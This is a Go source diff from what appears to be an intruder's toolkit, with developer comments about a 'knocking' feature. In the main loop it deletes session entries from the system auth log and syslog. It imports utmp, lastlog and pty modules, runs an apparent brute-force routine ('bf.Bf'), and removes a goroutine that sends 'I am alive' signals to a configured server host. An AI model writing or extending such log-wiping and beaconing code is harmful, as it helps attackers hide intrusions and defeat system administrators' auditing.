@@ -15,7 +15,6 @@ import (
 	bf "test/BF"
 	check "test/CHECK"
 	getpty "test/GETPTY"
-	knock "test/KNOCK"
 	lastlog "test/LASTLOG"
 	utmp "test/UTMP"
 	vars "test/VARS"
@@ -65,10 +64,15 @@ import (
 
 // After vacations still tring to fix this shitty mess.
 
+// made the knocking i dont know why it is a good idea but i will give it a try.
+
+// I have someone thath is looking at it. Somehow seems that it is doing something. I dont know if is a divine power that makes it work or i have made something
+// right for once
+
 var indexToDel int64
 var count int64
 var ProxyIp [16]byte
-var play bool = true
+var play bool = true // TODO delete
 var conf vars.Config
 
 func init() {
@@ -124,13 +128,17 @@ func main() {
 				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
 
 				err = authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, dataToInfl) //
-				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl)   //
-				fmt.Println(err)                                                    //
+				if err != nil {
+					fmt.Println(err)
+				}
+				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl) //
+				if err != nil {
+					fmt.Println(err)
+				} //
 
 			}
 		}
-		delay := 500 * time.Millisecond
-		go knock.SendIAmAlive(conf.Server.Host, 2, delay)
+
 		// if false {
 		bf.Bf(conf) //
 		// }
